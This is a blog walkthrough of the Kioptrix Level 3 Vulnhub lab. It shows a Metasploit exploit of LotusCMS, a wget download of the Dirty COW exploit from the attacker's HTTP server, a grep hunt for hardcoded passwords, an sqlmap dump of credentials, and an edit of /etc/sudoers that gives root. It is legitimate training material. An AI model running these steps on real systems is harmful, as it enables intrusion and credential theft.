<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.6.2"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Kioptrix Level 3 Vulnhub Walkthrough" /><meta name="author" content="Mohamed Ezzat" /><meta property="og:locale" content="en_US" /><meta name="description" content="Machine Info: Difficulty: Easy Goal: Gain root access" /><meta property="og:description" content="Machine Info: Difficulty: Easy Goal: Gain root access" /><link rel="canonical" href="https://mohamedaezzat.github.io/posts/kioptrix3/" /><meta property="og:url" content="https://mohamedaezzat.github.io/posts/kioptrix3/" /><meta property="og:site_name" content="Echo" /><meta property="og:image" content="https://mohamedaezzat.github.io/assets/img/posts/kioptrix3/kioptrix3.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-02T13:08:44+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://mohamedaezzat.github.io/assets/img/posts/kioptrix3/kioptrix3.png" /><meta property="twitter:title" content="Kioptrix Level 3 Vulnhub Walkthrough" /><meta name="google-site-verification" content="SgWV4a8DvyptkO8yPJwWMZ7DexcYzADmzpG_jTBbaVY" /> <script type="application/ld+json"> {"image":"https://mohamedaezzat.github.io/assets/img/posts/kioptrix3/kioptrix3.png","description":"Machine Info: Difficulty: Easy Goal: Gain root access","url":"https://mohamedaezzat.github.io/posts/kioptrix3/","headline":"Kioptrix Level 3 Vulnhub Walkthrough","dateModified":"2019-09-02T13:08:44+02:00","@type":"BlogPosting","datePublished":"2019-09-02T13:08:44+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mohamedaezzat.github.io/posts/kioptrix3/"},"author":{"@type":"Person","name":"Mohamed Ezzat"},"@context":"https://schema.org"}</script><title>Kioptrix Level 3 Vulnhub Walkthrough | Echo</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Echo</a></div><div class="site-subtitle font-italic">Hacking Stuff</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/MohamedAEzzat" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mohamedahmedpk','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kioptrix Level 3 Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kioptrix Level 3 Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 2, 2019, 1:08 PM +0200" > Sep 2, 2019 <i class="unloaded">2019-09-02T13:08:44+02:00</i> </span> by <span class="author"> Mohamed Ezzat </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/kioptrix3.png" class="preview-img"><h2 id="machine-info">Machine Info:</h2><ul><li>Difficulty: Easy<li>Goal: Gain root access</ul><h2 id="network-scanning">Network Scanning</h2><h3 id="netdiscover">Netdiscover</h3><p>As the previous times, we start running netdiscover to determine the target’s IP address through host-only adapter interface (eth1).</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netdiscover <span class="nt">-i</span> eth1
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/1.png" alt="netdiscover" /></p><h3 id="nmap">Nmap</h3><p>Then, we run nmap to scan all ports and discover open ports and services.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-A</span> 192.168.56.118
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/2.png" alt="nmap" /></p><h2 id="enumeration">Enumeration</h2><h3 id="enumerating-http-service">Enumerating HTTP service</h3><p>As a result of nmap, we found a couple of ports SSH:22 and HTTP:80. We start by HTTP service over port 80, so we go to the website to take a look what is going there.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/3.1.png" alt="HTTP:80" /></p><p>We found an admin login page and this page is powered by LotusCMS. Therefore, let’s try to find any public exploits for that service “LotusCMS”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/3.2.png" alt="Login_page" /></p><h2 id="exploitation">Exploitation</h2><p>We use searchsploit to search for any available exploits for “LotusCMS” or we can use our browser to search. We found <a href="https://www.exploit-db.com/exploits/18565">18565.rb</a> which is part of metasploit framework.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit LotusCMS
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/4.png" alt="searchsploit" /></p><p>We run msfconsole and search for “LotusCMS” then we use that found exploit, set the required parameters and run.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfconsole
search LotusCMS
use 0
options
<span class="nb">set </span>RHOSTS 192.168.56.118
<span class="nb">set </span>URI /index.php?system<span class="o">=</span>Admin
run
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/5.1.png" alt="msfconsole" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/5.2.png" alt="msfconsole" /></p><p>After running the exploit, we got a meterpreter shell then we open a shell terminal and promote it to tty shell (interactive shell). Now, we are in as a www-data user, so we need to privilege escalation.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>sysinfo
shell
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="nb">id</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/5.3.png" alt="www-data" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="method-1-dirty-cow">Method 1: Dirty COW</h3><p>From the above image, we know that the target machine is running on linux kernel 2.6.24. Therefore, we use searchsploit to search for any public privilege escalation exploits for that version “2.6.24”. We found <a href="https://www.exploit-db.com/exploits/40839">40839.c</a> which is an exploit uses the <a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c">pokemon.c</a> exploit of the dirtycow vulnerability as a base and generates a new passwd line. The user will be prompted for the new password when the binary is run. The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line. After running the exploit you should be able to login with the newly created user. The created user called “firefart” by default, but you can modify it to any other username as you want.<br /> We downloaded the exploit and uploaded it on a temporary web server using python in order to download it on the target machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Kali linux terminal</span>
searchsploit linux kernel 2.6.24 privilege escalation
searchsploit <span class="nt">-m</span> linux/local/40839.c
python <span class="nt">-m</span> SimpleHTTPServer
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/6.png" alt="searchsploit_DirtyCOW" /></p><p>We download the exploit on the target machine and compile it then run it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># target terminal</span>
wget http://192.168.56.157:8000/40839.c
gcc <span class="nt">-pthread</span> 40839.c <span class="nt">-o</span> 40839 <span class="nt">-lcrypt</span>
./40839
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/7.png" alt="dirty_execute" /></p><p>And finally, we login to SSH with our new created user “firefart” and we successfully gained access to root shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># target terminal</span>
ssh firefart@192.168.56.118
<span class="nb">cat</span> /etc/passwd
<span class="nb">id</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/8.png" alt="root1" /></p><h3 id="method-2-phpmyadmin">Method 2: phpmyadmin</h3><p>After we got a www-data shell, we are looking for users on the target machine. We found two users “loneferret” and “dreg”.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">tail</span> /etc/passwd
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/1.png" alt="etc_passwd" /></p><p>Therefore, we go to each directory of them looking for anything seems to be interested. We got nothing at dreg’s directory but at loneferret’s directory we found “CompanyPolicy.README” file. We opened that file and we have an email sent from the CEO that informs loneferret about an installed software for editting, creating, and viewing files called “ht”. So, we need to find a way to escalate our privileges to loneferret user in order to use that software.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /home
<span class="nb">ls
cd </span>dreg
<span class="nb">ls
cd</span> ..<span class="p">;</span> <span class="nb">cd </span>loneferret
<span class="nb">ls
cat </span>CompanyPolicy.README
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/2.png" alt="etc_passwd" /></p><p>We use the following find command to look for any hardcoded passwords and we found a mysql password “fuckeyou” that exists in “/home/www/kioptrix3.com/gallery/gconfig.php”.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find / <span class="nt">-maxdepth</span> 5 <span class="nt">-name</span> <span class="k">*</span>.php <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">grep</span> <span class="nt">-Hn</span> password <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/3.png" alt="etc_passwd" /></p><p>We go to the gallery directory and read the gconfig.php file. And we found a gallery database credentials (username: root and password: fuckeyou).</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /home/www/kioptrix3.com/gallery
<span class="nb">cat </span>gconfig.php
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/4.png" alt="etc_passwd" /></p><p>We run gobuster to make sure that there is a phpmyadmin directory on the target web server that we are going to use to login into mysql database.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://192.168.56.118/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/5.png" alt="etc_passwd" /></p><p>We go to phpmyadmin login page and enter our found credentials (root:fuckeyou).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/6.1.png" alt="root_fuckeyou" /></p><p>After we logged in successfully, we go to gallery database then dev_accounts tables then click on browse tab and accordingly we found the users and their password hashes.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/6.4.png" alt="dreg_loneferret_passwords" /></p><p>After that, we cracked the password hashes for both users by using <a href="https://crackstation.net/">crackstation</a> website.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/7.png" alt="crackstation" /></p><p>We successfully logged in to SSH as loneferret then we run the installed software “ht” with the sudo command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>ssh loneferret@192.168.56.118
<span class="nb">id
pwd
ls
cat </span>CompanyPolicy.README
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">sudo </span>ht
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/9.png" alt="ssh_login" /></p><p>When the ht software open, we press on F3 button to enter the file that we want to edit. We enter the /etc/sudoers file that contains the users and applications that can be run as root.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/10.2.png" alt="ht" /></p><p>We add “/bin/sh” at the end of loneferret line in order to be able to run “sh” and open a shell as root. Then we press on F10 button to save and exit.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/10.3.png" alt="ht" /></p><p>Now, we run /bin/sh with sudo command and we got a root shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">sudo</span> /bin/sh
<span class="nb">id</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_2/11.png" alt="root2" /></p><h3 id="method-3-sqlmap">Method 3: sqlmap</h3><p>We start from the point that we got a www-data shell. We run gobuster to find the available directories of the target website and we found /gallery that seems to be interested to us.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://192.168.56.118/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/gobuster.png" alt="gobuster" /></p><p>Therefore, let’s go to the website to see how the gallery page looks like. But before we are going, we need to add the target IP address on our local /etc/hosts file to resolve the IP address to its domain name.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vi /etc/hosts
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/1.png" alt="etc_hosts" /></p><p>After editing the /etc/hosts file, here is the gallery page as depicted below. We click on Ligoat Press Room then from sorting options list we select photo id.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/2.1.png" alt="gallery_page" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/2.3.png" alt="gallery_page" /></p><p>At the url, we have two parameters “id” and “sort”, we add single quote at id parameter and we noticed that it is injectable.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/2.4.png" alt="gallery_id_parameter" /></p><p>So, we run burp suite to intercept the request and save it to a file (for example, request.txt) in order to use that file with sqlmap later.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/3.png" alt="burp" /></p><p>We open the request.txt file and add the asterisk at the parameter that we want to inject which is id in our case.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vi request.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/4.png" alt="request_file" /></p><p>We use sqlmap tool to automate the process of sql injection. We run the following command to dump the databases and we have found gallery database.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> request.txt <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--dbs</span> <span class="nt">--batch</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/5.1.png" alt="sqlmap" /></p><p>Then, we dump the tables of gallery database and the dev_accounts table seems to be interested to us.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> request.txt <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">-D</span> gallery <span class="nt">--tables</span> <span class="nt">--batch</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/5.2.png" alt="sqlmap" /></p><p>Then, we dump the columns of the dev_accounts table and we got two users “dreg” and “loneferret” and their passwords.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> request.txt <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">-D</span> gallery <span class="nt">-T</span> dev_accounts <span class="nt">--dump</span> <span class="nt">--batch</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/5.3.png" alt="sqlmap" /></p><p>And again as we did in method 2; We login to ssh as loneferret and run the installed software “ht” with sudo command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>ssh loneferret@192.168.56.118
<span class="nb">id
ls
cat </span>CompanyPolicy.README
<span class="nb">sudo </span>ht
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">sudo </span>ht
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/6.2.png" alt="ssh_login" /></p><p>We press on F3 button and enter the file /etc/soduers to open. That file contains users and applications that can be run as root.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/7.2.png" alt="ht" /></p><p>After the file is opened, we add /bin/sh at the end of loneferret line so we can run the shell terminal as root.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/7.3.png" alt="ht" /></p><p>Now, we run /bin/sh with sudo command and we got a root shell.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix3/method_3/8.png" alt="root3" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/boot2root/" class="post-tag no-text-decoration" >boot2root</a> <a href="/tags/ethical-hacking/" class="post-tag no-text-decoration" >ethical hacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kioptrix Level 3 Vulnhub Walkthrough - Echo&url=https://mohamedaezzat.github.io/posts/kioptrix3/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab 